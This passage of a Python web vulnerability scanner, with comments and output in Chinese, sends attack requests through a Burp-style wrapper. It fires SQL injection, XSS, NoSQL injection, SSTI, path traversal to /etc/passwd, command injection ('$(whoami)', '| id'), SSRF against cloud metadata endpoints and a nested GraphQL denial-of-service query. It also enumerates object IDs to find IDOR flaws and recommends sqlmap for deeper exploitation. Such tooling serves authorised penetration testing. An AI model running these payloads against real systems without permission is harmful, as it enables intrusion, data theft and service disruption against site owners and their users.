    cmdi_payloads = ["; sleep 3", "| id", "$(whoami)"]
    
    payload_map = {
        "sqli": sqli_payloads,
        "xss": xss_payloads,
        "ssrf": ssrf_payloads,
        "cmdi": cmdi_payloads,
    }
    
    findings = []
    
    for header in headers:
        lines.append(f"🔍 测试头: {header}")
        
        for vuln_type in types:
            payloads = payload_map.get(vuln_type, [])
            
            for payload in payloads:
                custom_headers = {header: payload}
                r = burp.request("GET", url, headers=custom_headers)
                
                # 检测异常
                is_interesting = False
                reason = ""
                
                if r.error:
                    is_interesting = True
                    reason = f"触发错误: {r.error}"
                elif r.blocked:
                    reason = "被拦截"
                elif abs(r.length - baseline.length) > 100:
                    is_interesting = True
                    reason = f"响应变化: {r.length - baseline.length:+d}b"
                elif r.time_ms > baseline.time_ms + 2500:
                    is_interesting = True
                    reason = f"时间延迟: +{r.time_ms - baseline.time_ms:.0f}ms"
                elif payload in r.body:
                    is_interesting = True
                    reason = "Payload 反射"
                
                if is_interesting:
                    findings.append({
                        "header": header,
                        "payload": payload,
                        "type": vuln_type,
                        "reason": reason
                    })
                    lines.append(f"   ⚠️ [{vuln_type}] {payload[:30]}... → {reason}")
                
                time.sleep(burp.delay)
        
        lines.append("")
    
    # Cookie 测试
    if cookie:
        lines.append("🍪 测试 Cookie 注入")
        for vuln_type in types:
            payloads = payload_map.get(vuln_type, [])
            for payload in payloads:
                custom_headers = {"Cookie": f"{cookie}={payload}"}
                r = burp.request("GET", url, headers=custom_headers)
                
                if r.error or r.time_ms > baseline.time_ms + 2500:
                    findings.append({
                        "header": "Cookie",
                        "payload": payload,
                        "type": vuln_type,
                        "reason": r.error or "时间延迟"
                    })
                    lines.append(f"   ⚠️ [{vuln_type}] Cookie={payload[:20]}... → 异常")
                
                time.sleep(burp.delay)
        lines.append("")
    
    # 总结
    lines.append("=" * 50)
    if findings:
        lines.append(f"🎯 发现 {len(findings)} 个潜在问题:")
        for f in findings:
            lines.append(f"  - {f['header']}: {f['type']} ({f['reason']})")
    else:
        lines.append("✅ 未发现 HTTP 头注入漏洞")
    lines.append("=" * 50)
    
    return "\n".join(lines)


def test_idor(burp, url, range_str="1-100", wordlist=None, diff_threshold=50, test_ssrf=False):
    """
    IDOR 枚举测试
    
    Args:
        url: 包含 § 标记的 URL
        range_str: 枚举范围 (如 "1-100")
        wordlist: 字典文件路径
        diff_threshold: 响应差异阈值
        test_ssrf: 是否测试 SSRF
    """
    lines = ["=" * 50, "🔍 IDOR 枚举测试", "=" * 50, ""]
    
    marker = "§"
    if marker not in url:
        return "❌ URL 中需要包含 § 标记枚举点"
    
    # 生成测试值
    test_values = []
    
    if wordlist:
        try:
            with open(wordlist, "r") as f:
                test_values = [line.strip() for line in f if line.strip()]
        except:
            lines.append(f"⚠️ 无法读取字典文件: {wordlist}")
    
    if not test_values and range_str:
        try:
            start, end = map(int, range_str.split("-"))
            test_values = [str(i) for i in range(start, end + 1)]
        except:
            test_values = list(range(1, 101))
    
    lines.append(f"📊 测试范围: {len(test_values)} 个值")
    
    # 获取基线 (用第一个值)
    baseline_url = url.replace(marker, test_values[0])
    baseline = burp.get(baseline_url)
    lines.append(f"📊 基线: [{baseline.status}] {baseline.length}b")
    lines.append("")
    
    # 枚举
    found = []
    status_counts = {}
    
    for i, val in enumerate(test_values):
        test_url = url.replace(marker, val)
        r = burp.get(test_url)
        
        # 统计状态码
        status_counts[r.status] = status_counts.get(r.status, 0) + 1
        
        # 检测有趣的响应
        is_interesting = False
        reason = ""
        
        if r.status == 200 and baseline.status != 200:
            is_interesting = True
            reason = "状态码变化"
        elif r.status == 200 and abs(r.length - baseline.length) > diff_threshold:
            is_interesting = True
            reason = f"响应大小: {r.length}b (差异 {r.length - baseline.length:+d}b)"
        elif r.status in [301, 302] and "location" in str(r.headers).lower():
            is_interesting = True
            reason = f"重定向: {r.headers.get('location', '')[:50]}"
        
        if is_interesting:
            found.append({
                "value": val,
                "status": r.status,
                "length": r.length,
                "reason": reason
            })
            lines.append(f"  ✅ {val}: [{r.status}] {r.length}b - {reason}")
        
        # 进度
        if (i + 1) % 20 == 0:
            lines.append(f"  ... 已测试 {i + 1}/{len(test_values)}")
        
        time.sleep(burp.delay * 0.5)  # IDOR 测试可以快一点
    
    # SSRF 测试
    if test_ssrf:
        lines.append("")
        lines.append("🌐 SSRF 测试:")
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "http://[::1]",
        ]
        
        for payload in ssrf_payloads:
            test_url = url.replace(marker, payload)
            r = burp.get(test_url)
            
            # 检测 SSRF 特征
            ssrf_signs = ["root:", "ami-id", "instance-id", "localhost", "127.0.0.1"]
            for sign in ssrf_signs:
                if sign in r.body.lower():
                    found.append({
                        "value": payload,
                        "status": r.status,
                        "length": r.length,
                        "reason": f"SSRF: 检测到 {sign}"
                    })
                    lines.append(f"  ⚠️ SSRF: {payload} → 检测到 {sign}")
                    break
            
            time.sleep(burp.delay)
    
    # 总结
    lines.append("")
    lines.append("=" * 50)
    lines.append("📊 状态码统计:")
    for status, count in sorted(status_counts.items()):
        lines.append(f"  {status}: {count} 次")
    
    lines.append("")
    if found:
        lines.append(f"🎯 发现 {len(found)} 个有趣的响应:")
        for f in found[:20]:  # 最多显示 20 个
            lines.append(f"  - {f['value']}: [{f['status']}] {f['length']}b ({f['reason']})")
        if len(found) > 20:
            lines.append(f"  ... 还有 {len(found) - 20} 个")
    else:
        lines.append("❌ 未发现 IDOR 漏洞")
    lines.append("=" * 50)
    
    return "\n".join(lines)


def test_post_form(burp, url, params, data, types=None):
    """
    POST 表单注入测试
    
    Args:
        url: 目标 URL
        params: 要测试的参数名列表
        data: POST 数据字符串 (如 "user=admin&pass=test")
        types: 测试类型列表
    """
    if types is None:
        types = ["sqli"]
    
    lines = ["=" * 50, "📝 POST 表单注入测试", "=" * 50, ""]
    
    # 解析 POST 数据
    try:
        form_data = dict(urllib.parse.parse_qsl(data))
    except:
        return "❌ 无法解析 POST 数据，格式应为: key1=value1&key2=value2"
    
    lines.append(f"📊 目标: {url}")
    lines.append(f"📊 参数: {list(form_data.keys())}")
    lines.append(f"📊 测试: {params}")
    lines.append("")
    
    # 基线
    baseline = burp.post(url, data=form_data)
    lines.append(f"📊 基线: [{baseline.status}] {baseline.length}b {baseline.time_ms:.0f}ms")
    lines.append("")
    
    # Payload 映射
    sqli_payloads = [
        "'", '"', "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
        "admin'--", "' AND '1'='2", "1' AND SLEEP(3)--",
        "' UNION SELECT NULL--", "') OR ('1'='1",
    ]
    xss_payloads = ["<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>"]
    
    payload_map = {
        "sqli": sqli_payloads,
        "xss": xss_payloads,
    }
    
    findings = []
    
    for param in params:
        if param not in form_data:
            lines.append(f"⚠️ 参数 {param} 不在 POST 数据中，跳过")
            continue
        
        original_value = form_data[param]
        lines.append(f"🔍 测试参数: {param} (原值: {original_value})")
        
        for vuln_type in types:
            payloads = payload_map.get(vuln_type, sqli_payloads)
            
            for payload in payloads:
                # 构造测试数据
                test_data = form_data.copy()
                test_data[param] = payload
                
                r = burp.post(url, data=test_data)
                
                # 检测异常
                is_interesting = False
                reason = ""
                
                if r.error:
                    is_interesting = True
                    reason = f"触发错误: {r.error}"
                elif r.blocked:
                    reason = "被拦截"
                elif r.status != baseline.status:
                    is_interesting = True
                    reason = f"状态码变化: {baseline.status} → {r.status}"
                elif abs(r.length - baseline.length) > 100:
                    is_interesting = True
                    reason = f"响应变化: {r.length - baseline.length:+d}b"
                elif r.time_ms > baseline.time_ms + 2500:
                    is_interesting = True
                    reason = f"时间延迟: +{r.time_ms - baseline.time_ms:.0f}ms"
                elif payload in r.body:
                    is_interesting = True
                    reason = "Payload 反射"
                
                if is_interesting:
                    findings.append({
                        "param": param,
                        "payload": payload,
                        "type": vuln_type,
                        "reason": reason,
                        "status": r.status,
                        "length": r.length
                    })
                    lines.append(f"   ⚠️ [{vuln_type}] {payload[:40]}... → {reason}")
                
                time.sleep(burp.delay)
        
        lines.append("")
    
    # 总结
    lines.append("=" * 50)
    if findings:
        lines.append(f"🎯 发现 {len(findings)} 个潜在问题:")
        for f in findings:
            lines.append(f"  - {f['param']}: {f['type']} ({f['reason']})")
            lines.append(f"    Payload: {f['payload'][:60]}")
        
        # 给出下一步建议
        lines.append("")
        lines.append("💡 建议下一步:")
        sqli_findings = [f for f in findings if f['type'] == 'sqli']
        if sqli_findings:
            lines.append("  1. 使用 confirm-blind 命令确认时间盲注")
            lines.append("  2. 尝试 sqlmap 进行深度利用")
    else:
        lines.append("✅ 未发现明显漏洞")
        lines.append("💡 建议: 尝试更多 payload 或测试其他参数")
    lines.append("=" * 50)
    
    return "\n".join(lines)


# ============================================================
#                    API 测试函数 (新增)
# ============================================================

def test_api_json(burp, url, body, param, method="POST", headers=None, types=None):
    """
    JSON API 参数测试
    
    Args:
        url: API URL
        body: JSON Body 字符串
        param: 要测试的参数名 (支持嵌套，如 "user.id")
        method: HTTP 方法 (POST/PUT/PATCH)
        headers: 自定义头
        types: 测试类型
    """
    if types is None:
        types = ["sqli"]
    
    lines = ["=" * 60, "🔌 JSON API 参数测试", "=" * 60, ""]
    
    # 解析 JSON
    try:
        json_data = json.loads(body)
    except json.JSONDecodeError as e:
        return f"❌ JSON 解析错误: {e}"
    
    lines.append(f"📊 目标: {url}")
    lines.append(f"📊 方法: {method}")
    lines.append(f"📊 测试参数: {param}")
    lines.append(f"📊 原始 Body: {body[:100]}...")
    lines.append("")
    
    # 解析自定义头
    custom_headers = {"Content-Type": "application/json"}
    if headers:
        for h in headers.split(";"):
            if ":" in h:
                k, v = h.split(":", 1)
                custom_headers[k.strip()] = v.strip()
    
    # 基线请求
    baseline = burp.request(method, url, headers=custom_headers, data=json.dumps(json_data))
    lines.append(f"📊 基线: [{baseline.status}] {baseline.length}b {baseline.time_ms:.0f}ms")
    lines.append("")
    
    # Payload 映射
    sqli_payloads = [
        "'", '"', "' OR '1'='1", "1' AND SLEEP(3)--",
        "' UNION SELECT NULL--", "1 OR 1=1",
    ]
    nosqli_payloads = [
        '{"$gt": ""}', '{"$ne": null}', '{"$regex": ".*"}',
        "'; return true; var x='", '{"$where": "sleep(3000)"}',
    ]
    xss_payloads = ["<script>alert(1)</script>", "'\"><img src=x onerror=alert(1)>"]
    ssti_payloads = ["{{7*7}}", "${7*7}", "#{7*7}"]
    
    payload_map = {
        "sqli": sqli_payloads,
        "nosqli": nosqli_payloads,
        "xss": xss_payloads,
        "ssti": ssti_payloads,
    }
    
    findings = []
    
    # 获取原始值
    original_value = _get_nested_value(json_data, param)
    if original_value is None:
        lines.append(f"⚠️ 参数 {param} 不存在于 JSON 中")
        return "\n".join(lines)
    
    lines.append(f"🔍 测试参数: {param} (原值: {original_value})")
    lines.append("")
    
    for vuln_type in types:
        payloads = payload_map.get(vuln_type, sqli_payloads)
        lines.append(f"📋 测试 {vuln_type.upper()} ({len(payloads)} payloads):")
        
        for payload in payloads:
            # 构造测试数据
            test_data = json.loads(json.dumps(json_data))  # 深拷贝
            _set_nested_value(test_data, param, payload)
            
            r = burp.request(method, url, headers=custom_headers, data=json.dumps(test_data))
            
            # 检测异常
            is_interesting = False
            reason = ""
            
            if r.error:
                is_interesting = True
                reason = f"触发错误: {r.error}"
            elif r.blocked:
                reason = "被拦截"
            elif r.status >= 500:
                is_interesting = True
                reason = f"服务器错误: {r.status}"
            elif r.status != baseline.status:
                is_interesting = True
                reason = f"状态码变化: {baseline.status} → {r.status}"
            elif abs(r.length - baseline.length) > 100:
                is_interesting = True
                reason = f"响应变化: {r.length - baseline.length:+d}b"
            elif r.time_ms > baseline.time_ms + 2500:
                is_interesting = True
                reason = f"时间延迟: +{r.time_ms - baseline.time_ms:.0f}ms"
            
            # 检查响应中的错误信息
            error_signs = ["error", "exception", "syntax", "invalid", "failed"]
            for sign in error_signs:
                if sign in r.body.lower() and sign not in baseline.body.lower():
                    is_interesting = True
                    reason = f"响应包含: {sign}"
                    break
            
            if is_interesting:
                findings.append({
                    "param": param,
                    "payload": payload,
                    "type": vuln_type,
                    "reason": reason,
                    "status": r.status
                })
                lines.append(f"   ⚠️ {payload[:40]}... → {reason}")
            
            time.sleep(burp.delay)
        
        lines.append("")
    
    # 总结
    lines.append("=" * 60)
    if findings:
        lines.append(f"🎯 发现 {len(findings)} 个潜在问题:")
        for f in findings:
            lines.append(f"  - [{f['type']}] {f['reason']}")
            lines.append(f"    Payload: {f['payload']}")
    else:
        lines.append("✅ 未发现明显漏洞")
    lines.append("=" * 60)
    
    return "\n".join(lines)


def test_api_rest(burp, url, method="GET", headers=None, types=None):
    """
    REST API 路径参数测试
    
    Args:
        url: API URL (用 § 标记注入点，如 /users/§1§/profile)
        method: HTTP 方法
        headers: 自定义头
        types: 测试类型
    """
    if types is None:
        types = ["sqli", "idor"]
    
    marker = "§"
    if marker not in url:
        return "❌ URL 中需要包含 § 标记注入点 (如 /users/§1§/profile)"
    
    lines = ["=" * 60, "🛤️ REST API 路径参数测试", "=" * 60, ""]
    
    lines.append(f"📊 目标: {url}")
    lines.append(f"📊 方法: {method}")
    lines.append("")
    
    # 解析自定义头
    custom_headers = {}
    if headers:
        for h in headers.split(";"):
            if ":" in h:
                k, v = h.split(":", 1)
                custom_headers[k.strip()] = v.strip()
    
    # 提取原始值
    import re
    match = re.search(r'§([^§]*)§', url)
    original_value = match.group(1) if match else "1"
    
    # 基线请求
    baseline_url = url.replace(f"§{original_value}§", original_value)
    baseline = burp.request(method, baseline_url, headers=custom_headers)
    lines.append(f"📊 基线: [{baseline.status}] {baseline.length}b")
    lines.append("")
    
    # Payload 映射
    sqli_payloads = ["'", "1'", "1 OR 1=1", "1' AND '1'='1", "1; SELECT 1--"]
    idor_payloads = ["0", "1", "2", "999", "-1", "admin", "null", "../1"]
    xss_payloads = ["<script>", "'\"><img src=x>"]
    lfi_payloads = ["../etc/passwd", "....//etc/passwd", "%2e%2e%2fetc/passwd"]
    
    payload_map = {
        "sqli": sqli_payloads,
        "idor": idor_payloads,
        "xss": xss_payloads,
        "lfi": lfi_payloads,
    }
    
    findings = []
    
    for vuln_type in types:
        payloads = payload_map.get(vuln_type, sqli_payloads)
        lines.append(f"📋 测试 {vuln_type.upper()}:")
        
        for payload in payloads:
            test_url = url.replace(f"§{original_value}§", str(payload))
            r = burp.request(method, test_url, headers=custom_headers)
            
            is_interesting = False
            reason = ""
            
            if r.error:
                is_interesting = True
                reason = f"触发错误: {r.error}"
            elif r.status == 200 and baseline.status != 200:
                is_interesting = True
                reason = f"状态码变化: {baseline.status} → 200 (可能 IDOR)"
            elif r.status >= 500:
                is_interesting = True
                reason = f"服务器错误: {r.status}"
            elif vuln_type == "idor" and r.status == 200:
                if abs(r.length - baseline.length) > 50:
                    is_interesting = True
                    reason = f"响应变化: {r.length}b (可能 IDOR)"
            elif vuln_type == "lfi" and ("root:" in r.body or "[boot" in r.body):
                is_interesting = True
                reason = "LFI 成功!"
            
            if is_interesting:
                findings.append({
                    "payload": payload,
                    "type": vuln_type,
                    "reason": reason,
                    "status": r.status,
                    "length": r.length
                })
                lines.append(f"   ⚠️ {payload} → {reason}")
            
            time.sleep(burp.delay)
        
        lines.append("")
    
    # 总结
    lines.append("=" * 60)
    if findings:
        lines.append(f"🎯 发现 {len(findings)} 个潜在问题:")
        for f in findings:
            lines.append(f"  - [{f['type']}] {f['payload']} → {f['reason']}")
    else:
        lines.append("✅ 未发现明显漏洞")
    lines.append("=" * 60)
    
    return "\n".join(lines)


def test_api_graphql(burp, url, query, variables=None, headers=None):
    """
    GraphQL API 测试
    
    Args:
        url: GraphQL endpoint URL
        query: GraphQL 查询 (用 § 标记注入点)
        variables: GraphQL 变量 (JSON)
        headers: 自定义头
    """
    marker = "§"
    
    lines = ["=" * 60, "📊 GraphQL API 测试", "=" * 60, ""]
    
    lines.append(f"📊 目标: {url}")
    lines.append(f"📊 查询: {query[:100]}...")
    lines.append("")
    
    # 解析自定义头
    custom_headers = {"Content-Type": "application/json"}
    if headers:
        for h in headers.split(";"):
            if ":" in h:
                k, v = h.split(":", 1)
                custom_headers[k.strip()] = v.strip()
    
    # 解析变量
    vars_dict = {}
    if variables:
        try:
            vars_dict = json.loads(variables)
        except:
            lines.append("⚠️ 变量 JSON 解析失败")
    
    # 基线请求
    baseline_query = query.replace(marker, "")
    baseline_body = json.dumps({"query": baseline_query, "variables": vars_dict})
    baseline = burp.request("POST", url, headers=custom_headers, data=baseline_body)
    lines.append(f"📊 基线: [{baseline.status}] {baseline.length}b")
    lines.append("")
    
    # GraphQL 特定 payload
    payloads = [
        # SQLi
        "'", "' OR '1'='1", "1' AND SLEEP(3)--",
        # NoSQLi
        '{"$ne": null}', '{"$gt": ""}',
        # 内省
        "__schema{types{name}}", "__type(name:\"User\"){fields{name}}",
        # 批量查询
        "...on User{id,email,password}",
        # 拒绝服务
        "{" + "a{b" * 50 + "}" * 50,
    ]
    
    findings = []
    
    lines.append("📋 测试 GraphQL 注入:")
    
    for payload in payloads:
        if marker in query:
            test_query = query.replace(marker, payload)
        else:
            test_query = query + payload
        
        test_body = json.dumps({"query": test_query, "variables": vars_dict})
        r = burp.request("POST", url, headers=custom_headers, data=test_body)
        
        is_interesting = False
        reason = ""
        
        if r.error:
            is_interesting = True
            reason = f"触发错误: {r.error}"
        elif r.status >= 500:
            is_interesting = True
            reason = f"服务器错误: {r.status}"
        elif r.time_ms > baseline.time_ms + 2500:
            is_interesting = True
            reason = f"时间延迟: +{r.time_ms - baseline.time_ms:.0f}ms"
        elif "__schema" in payload and "types" in r.body:
            is_interesting = True
            reason = "内省查询成功!"
        elif "errors" in r.body and "errors" not in baseline.body:
            # 检查是否有新的错误信息
            is_interesting = True
            reason = "触发 GraphQL 错误"
        
        if is_interesting:
            findings.append({
                "payload": payload[:50],
                "reason": reason,
                "status": r.status
            })
            lines.append(f"   ⚠️ {payload[:40]}... → {reason}")
        
        time.sleep(burp.delay)
    
    lines.append("")
    
    # 总结
    lines.append("=" * 60)
    if findings:
        lines.append(f"🎯 发现 {len(findings)} 个潜在问题:")
        for f in findings:
            lines.append(f"  - {f['payload']} → {f['reason']}")
    else:
        lines.append("✅ 未发现明显漏洞")
    lines.append("=" * 60)
    
    return "\n".join(lines)


# 辅助函数: 获取嵌套 JSON 值
def _get_nested_value(data, key):
    """获取嵌套 JSON 值 (支持 user.id 格式)"""
    keys = key.split(".")
    value = data
    for k in keys:
        if isinstance(value, dict) and k in value:
            value = value[k]
        elif isinstance(value, list) and k.isdigit():
            value = value[int(k)]
        else:
            return None
    return value


# 辅助函数: 设置嵌套 JSON 值
def _set_nested_value(data, key, value):
    """设置嵌套 JSON 值 (支持 user.id 格式)"""
    keys = key.split(".")
    obj = data
    for k in keys[:-1]:
        if isinstance(obj, dict) and k in obj:
            obj = obj[k]
        elif isinstance(obj, list) and k.isdigit():
            obj = obj[int(k)]
        else:
            return
    
    final_key = keys[-1]
    if isinstance(obj, dict):
        obj[final_key] = value
    elif isinstance(obj, list) and final_key.isdigit():
        obj[int(final_key)] = value


if __name__ == "__main__":
    main()
